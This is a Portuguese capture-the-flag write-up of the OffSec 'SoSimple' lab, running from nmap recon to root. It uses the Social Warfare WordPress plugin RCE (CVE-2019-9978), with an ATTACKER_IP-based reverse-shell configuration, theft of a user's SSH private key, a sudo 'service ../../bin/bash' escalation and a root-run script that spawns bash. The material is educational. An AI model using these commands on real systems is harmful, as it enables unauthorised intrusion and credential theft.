SoSimple Writeup — do recon ao root

A OffSec classifica a SoSimple como fácil (easy), mas a comunidade considera o nível médio. A enumeração inicial, o acesso e a movimentação lateral não são difíceis — o que pesa é o escalonamento de privilégios e a quantidade de rabbit holes espalhados pela máquina.

Plataforma: OffSecFoco: Boot2Root · Web · Linux PrivEscPágina na OffSec ↗

1 · Reconhecimento

Assim que recebo o IP da máquina, a primeira coisa é mapear o ambiente. Começo com dois scans do nmap: um rápido em todas as portas, só para ver o que está aberto, e depois um detalhado nas portas que importam, para identificar serviço e versão de cada uma.

sudo nmap -p- --min-rate 5000 -Pn 192.168.149.78
sudo nmap -sC -sV -p22,80 -Pn 192.168.149.78

Apenas 22 (SSH) e 80 (HTTP) respondem. Sempre que você vir um laboratório com poucas portas abertas (como aqui), já se prepare para uma enumeração detalhada, com calma e profundidade — é nela que o caminho aparece.

2 · Enumeração web

Ao acessar o IP na porta 80, sou recebido por uma página com o texto SO SIMPLE (muito simples).

Faço uma enumeração de diretórios com dirsearch (ultimamente tenho gostado de trabalhar com dirsearch e ffuf) e encontro dois caminhos interessantes: /wordpress/ e /wordpress/wp-login.php.

dirsearch -u http://192.168.149.78/

Em /wordpress/ encontro um site chamado “Why it’s so simple?” — uma instalação padrão do WordPress.

Olho o código-fonte da página e encontro algo chamado Social Warfare v3.5.0. Sempre que encontro nomes incomuns assim, faço uma busca na web para saber do que se trata — é um hábito que resolve metade das máquinas.

3 · Acesso inicial — RCE no Social Warfare

Pesquisando “Social Warfare exploit”, encontro um exploit de RCE publicado no Exploit-DB (CVE-2019-9978) para a versão 3.5.x do plugin. A versão e o método batem com o que vi no alvo.

Leio o uso do script e vejo que faz sentido: ele cria um payload PHP, sobe um servidor HTTP para servi-lo, abre um listener e dispara a vulnerabilidade pelo parâmetro swp_debug. No sucesso, retorna uma shell como www-data.

Então preencho a configuração do exploit com os dados do meu host e do lab:

  • TARGET_URL: o IP da máquina com o diretório /wordpress, porque o payload precisa tocar no serviço.
  • ATTACKER_IP: o IP da sua VPN.
  • HTTP_PORT: porta web em que o serviço roda — aqui, 80.
  • LISTEN_PORT: a porta em que você recebe a shell reversa (4444, 1234…).
TARGET_URL   = "http://192.168.149.78/wordpress"
ATTACKER_IP  = "192.168.45.156"   # IP da sua VPN
HTTP_PORT    = 80
LISTEN_PORT  = 4444
PAYLOAD_FILE = "payload.txt"

Executo com python3 exploit.py e o acesso inicial é obtido com sucesso — sou o usuário www-data.

python3 exploit.py

Vale dizer que há outros caminhos para o acesso inicial: um scan com wpscan pode trazer a versão instalada e o Social Warfare, e às vezes até o nome de um usuário. As informações de usuário e do banco MySQL eu só consigo depois de logado, mas você pode tentar rotas diferentes se quiser.

4 · Flag de usuário (local.txt)

Como o www-data tem acesso à pasta do usuário max, verifico o que há em /home/max e encontro a flag do lab em local.txt.

cat /home/max/local.txt

Essa máquina está cheia de rabbit holes e arquivos deixados ali só para te distrair (o criador claramente é fã de F1). Mantenha o foco e o pensamento crítico, ou ela te faz dar voltas.

5 · Movimentação lateral — virar o usuário max

Ainda como www-data, olho dentro da home do max. A pasta .ssh chama a atenção, porque sei que a porta 22 está aberta. Lá dentro encontro o id_rsa — a chave privada de SSH do max. Ou seja: posso me tornar o max e acessar via SSH.

cat /home/max/.ssh/id_rsa

Copio a chave id_rsa para um arquivo no meu host, concedo a permissão 600 com chmod 600 id_rsa e então me conecto com ssh -i id_rsa max@192.168.149.78.

chmod 600 id_rsa
ssh -i id_rsa max@192.168.149.78
Por que isso funciona

O ssh se recusa a usar uma chave privada se o arquivo estiver com permissões frouxas (legível por grupo ou por outros). Ele exibe o aviso UNPROTECTED PRIVATE KEY FILE! e ignora a chave, caindo de volta na autenticação por senha. O chmod 600 deixa o arquivo legível e gravável apenas pelo dono, satisfazendo essa checagem de segurança — aí sim o ssh aceita a chave.

6 · Do max ao steven — sudo + service

Com o comando sudo -l verifico o que o max pode executar com sudo (um quick win em muitas máquinas) e percebo que ele pode rodar, sem senha (NOPASSWD), o /usr/sbin/service como o usuário steven. Então executo:

sudo -l
sudo -u steven /usr/sbin/service ../../bin/bash
Por que isso funciona

O service é feito para iniciar serviços: ele monta o caminho /etc/init.d/<nome> e executa esse script. Passando ../../bin/bash como “nome”, o caminho vira /etc/init.d/../../bin/bash, que o sistema resolve como /bin/bash.

Como o max pode rodar o service como steven via sudo, esse /bin/bash é executado com a identidade do steven — e eu ganho um shell como steven. É a técnica clássica do GTFOBins para o binário service.

7 · Escalonamento até root

Como steven, repito a verificação sudo -l e vejo que ele pode executar como root o script /opt/tools/server-health.sh. O caminho para o root está aberto.

sudo -l

Primeiro verifico se a pasta /opt/tools existe — e não existe. Então o que eu preciso fazer?

ls -la /opt/tools
# ls: cannot access '/opt/tools': No such file or directory

Como o script que o sudo vai executar como root não existe e eu posso criá-lo, basta escrevê-lo eu mesmo. O passo a passo:

  1. Crio a pasta: mkdir /opt/tools.
  2. Crio o arquivo: touch /opt/tools/server-health.sh.
  3. Com o vi (ou nano — mas eu sou da família do vi) escrevo o conteúdo do script.
  4. Dou permissão de execução: chmod +x /opt/tools/server-health.sh.
  5. Executo via sudo e viro root: sudo -u root /opt/tools/server-health.sh.

O conteúdo do server-health.sh é simplesmente:

#!/bin/bash
bash
Por que isso funciona

O #!/bin/bash é o shebang: diz ao kernel para executar o arquivo usando o interpretador /bin/bash. A linha seguinte, bash, abre um shell interativo.

Como o sudo roda o script inteiro como root, esse bash herda os privilégios de root — ou seja, ganho um shell de root. A falha aqui é um sudo apontando para um script em um caminho que eu controlo (podia criar): quem controla o conteúdo do script, controla o que roda como root.

E assim me torno root. Capturo a proof.txt — objetivo final conquistado. (O flag.txt na /root é um dos rabbit holes: “This is not the flag you’re looking for…”.)

cat /root/proof.txt

8 · Pwned

SoSimple caída: do RCE no Social Warfare como www-data, passando pela chave SSH do max, pelo service como steven, até o root por um sudo em caminho controlado. A lição que fica: em máquinas com poucas portas, a enumeração paciente e o bom e velho sudo -l resolvem — desde que você não se perca nos rabbit holes.
